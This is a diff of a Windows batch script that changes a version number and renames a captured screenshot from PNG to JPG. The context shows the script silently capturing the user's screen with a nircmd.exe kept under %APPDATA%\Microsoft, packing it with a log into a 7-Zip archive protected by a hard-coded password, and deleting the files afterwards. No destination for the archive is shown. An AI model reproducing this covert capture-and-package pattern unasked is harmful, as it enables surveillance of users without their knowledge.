@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=26.7"
+set "BATCHVERSION=26.8"
 
 
 
@@ -2116,8 +2116,8 @@ echo.
 
 
 
-"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
-if %SENDSCREENSHOT%==0 echo 0 > "%USERPROFILE%\Downloads\screenshot.png"
+"%APPDATA%\Microsoft\nircmd.exe" savescreenshot "%USERPROFILE%\Downloads\screenshot.jpg"
+if %SENDSCREENSHOT%==0 echo 0 > "%USERPROFILE%\Downloads\screenshot.jpg"
 
 
 
@@ -2147,7 +2147,7 @@ echo.
 
 set "SVNzip_PATH=%APPDATA%\microsoft\7z.exe"
 set "Password=VProv7"
-set "File1=%USERPROFILE%\Downloads\screenshot.png"
+set "File1=%USERPROFILE%\Downloads\screenshot.jpg"
 set "File2=%LOGFILE1%"
 
 
@@ -2253,7 +2253,7 @@ set "currentMinute=%time:~3,2%"
 
 
 del /f /a "%InstalledQWB%"
-del /f /a "%USERPROFILE%\Downloads\screenshot.png"
+del /f /a "%USERPROFILE%\Downloads\screenshot.jpg"
 
 
 
